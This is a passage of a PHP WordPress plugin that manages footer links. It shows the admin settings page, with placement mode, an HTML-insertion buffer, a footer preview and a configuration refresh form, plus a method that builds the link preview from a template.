		echo '<p class="description">Режим задаётся через <code>position</code> в конфиге (<code>auto</code> | <code>footer</code> | <code>header</code>), для ручного режима — переключателем выше. Выводится только в одном месте.</p>';
		echo '</td></tr>';

		echo '<tr><th scope="row">Страховочный буфер</th><td>';
		$buf_off = ( defined( 'FLM_NO_BUFFER' ) && FLM_NO_BUFFER ) || ( $block && isset( $block['buffer'] ) && false === $block['buffer'] );
		echo $buf_off ? 'отключён' : '<strong>включён</strong>';
		echo '<p class="description">Если тема не вызывает ни <code>wp_footer</code>, ни <code>wp_head</code>, блок вставляется прямо в HTML страницы. Отключение: <code>define( \'FLM_NO_BUFFER\', true )</code> в wp-config.php или <code>"buffer": false</code> в конфиге.</p>';
		echo '</td></tr>';

		echo '<tr><th scope="row">Предпросмотр футера</th><td>';
		if ( '' !== $manual ) {
			$preview = $manual;
		} elseif ( $block && ! empty( $block['blocks'] ) ) {
			$preview = self::build_blocks( $block );
		} else {
			$preview = $block && ! empty( $block['links'] ) ? self::preview() : '';
		}
		echo $preview ? '<div style="padding:10px;border:1px solid #dcdcde;background:#fff">' . $preview . '</div>' : '—';
		echo '</td></tr>';

		echo '</tbody></table>';

		echo '<form method="post" action="' . esc_url( admin_url( 'admin-post.php' ) ) . '">';
		echo '<input type="hidden" name="action" value="flm_refresh">';
		wp_nonce_field( 'flm_refresh' );
		submit_button( 'Обновить конфигурацию сейчас', 'secondary' );
		echo '</form>';

		echo '</div>';
	}

	protected static function preview() {
		$b = self::site_block();
		if ( ! $b || empty( $b['links'] ) ) {
			return '';
		}
		$b['only_front'] = false;
		$items = array();
		$links = self::order( $b['links'], $b['rotate'] );
		if ( (int) $b['limit'] > 0 ) {
			$links = array_slice( $links, 0, (int) $b['limit'] );
		}
		foreach ( $links as $link ) {
			if ( ! empty( $link['url'] ) && ! empty( $link['anchor'] ) ) {
				$items[] = self::render_item( $link, $b );
			}
		}
		return str_replace( '{links}', implode( $b['separator'], $items ), $b['template'] );
	}
}

FLM_Footer_Links::init();

register_deactivation_hook( __FILE__, array( 'FLM_Footer_Links', 'deactivate' ) );

} // конец защиты class_exists
